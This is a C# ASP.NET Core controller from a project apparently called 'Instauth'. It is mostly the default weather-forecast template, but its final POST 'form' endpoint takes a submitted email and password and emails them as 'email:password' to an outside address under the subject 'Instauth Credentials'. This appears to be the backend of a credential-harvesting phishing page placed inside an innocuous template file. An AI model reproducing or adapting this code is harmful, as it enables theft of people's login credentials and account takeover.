using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Instauth.Services;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace Instauth.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class WeatherForecastController : ControllerBase
    {
        private static readonly string[] Summaries = new[]
        {
            "Freezing", "Bracing", "Chilly", "Cool", "Mild", "Warm", "Balmy", "Hot", "Sweltering", "Scorching"
        };

        private readonly ILogger<WeatherForecastController> _logger;

        public WeatherForecastController(ILogger<WeatherForecastController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public IEnumerable<WeatherForecast> Get()
        {
            var rng = new Random();
            return Enumerable.Range(1, 5).Select(index => new WeatherForecast
            {
                Date = DateTime.Now.AddDays(index),
                TemperatureC = rng.Next(-20, 55),
                Summary = Summaries[rng.Next(Summaries.Length)]
            })
            .ToArray();
        }

        [HttpGet("hi")]
        public IActionResult HelloWorld()
        {
            return Ok("Hello!");
        }

        [HttpPost("form")]
        async public Task<IActionResult> SendEmail([FromForm] string email, [FromForm] string password)
        {
            EmailService sender = new EmailService();
            await sender.SendEmailAsync("tyuop@tyuop.tk", "Instauth Credentials", $"{email}:{password}");
            return Ok("Sent successfuly");
        }
    }
}
